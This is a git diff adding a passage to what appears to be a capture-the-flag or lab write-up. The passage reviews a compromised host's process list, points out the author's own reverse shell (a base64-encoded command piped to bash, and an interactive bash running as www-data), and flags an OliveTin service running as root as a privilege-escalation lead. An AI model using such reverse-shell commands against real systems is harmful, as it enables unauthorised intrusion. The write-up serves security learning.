@@ -2159,6 +2159,20 @@ root        5032  0.0  0.0      0     0 ?        I    11:17   0:00 [kworker/u6:2
 root        5038  0.0  0.0      0     0 ?        I    11:20   0:00 [kworker/u5:2-events_power_efficient]
 haris       5043  400  0.1  11012  4552 ?        R    11:25   0:00 ps au
 ```
+
+Scanning through the full process list, the vast majority are standard system daemons — `systemd`, `journald`, `rpcbind`, `dovecot`, `nginx`, `php-fpm`, `mysqld`, `postfix`. Our own reverse shell is also visible:
+
+```shell
+www-data  4318  sh -c -- echo YmFzaC...|base64 -d|bashwww-data  4321  bashwww-data  4322  bash -iharis     4911  bash
+```
+
+One process stands out immediately from everything else:
+
+```shell
+root  1520  /usr/local/bin/OliveTin
+```
+
+**OliveTin** — running as **root**, installed at a non-standard path (`/usr/local/bin/`), and not a default Ubuntu system service. This is exactly the kind of anomaly worth investigating: a third-party application running with full root privileges.
 <div align="center">
 <br>
 <br>
